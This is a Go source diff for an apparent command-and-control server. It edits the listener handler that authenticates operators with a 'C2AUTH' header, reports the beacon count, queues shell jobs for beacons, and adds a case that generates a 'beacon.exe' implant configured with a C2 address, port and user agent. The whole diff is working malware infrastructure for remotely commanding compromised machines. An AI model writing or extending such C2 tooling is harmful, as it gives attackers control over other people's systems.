@@ -9,8 +9,7 @@ import (
 )
 
 var expectedHeaders = map[string]string{
-	"Custom-Header1": "Value1",
-	"Custom-Header2": "Value2",
+	"User-Agent": "Value1",
 }
 
 var upgrader = websocket.Upgrader{
@@ -61,7 +60,7 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 		defer r.Body.Close()
 		w.WriteHeader(http.StatusOK)
 
-		if headers.Get("IAMFROM") == "C2AUTH" {
+		if headers.Get("Iamfrom") == "C2AUTH" {
 			var res []byte
 			switch Check_Command(body) {
 			case 0:
@@ -69,7 +68,7 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 			case BEACONS:
 				tmp := len(listener.Beacons)
 				res = append(res, IntToUint8(tmp))
-				Send_Bytes_to(w, res, "http://localhost:50049", expectedHeaders)
+				Send_Bytes_to(w, res, "http://localhost:50049/c2", expectedHeaders)
 				res = make([]byte, 0)
 				break
 			case SHELL:
@@ -81,6 +80,18 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 				job.funny = true
 
 				listener.Beacons[id].jobs = append(listener.Beacons[id].jobs, job)
+			case NEWBEACON:
+				var config OblivionisConfig
+				config.c2addr = "127.0.0.1"
+				config.c2port = 8080
+				config.useragent = "Value1"
+				config.a = listener.A
+				config.url = ""
+				config.sleep = 1
+				config.host = "testhost"
+				GenerateOblivionis(config, "./beacons/beacon.exe")
+
+				println("had made beacon")
 			}
 
 		} else {
@@ -102,6 +113,6 @@ func main() {
 	port2 := 50050
 	lisname := "ilovec2"
 	go StartListener(uri, port1, lisname)
-	go StartClient(uri, port2)
+	StartClient("client", port2)
 
 }
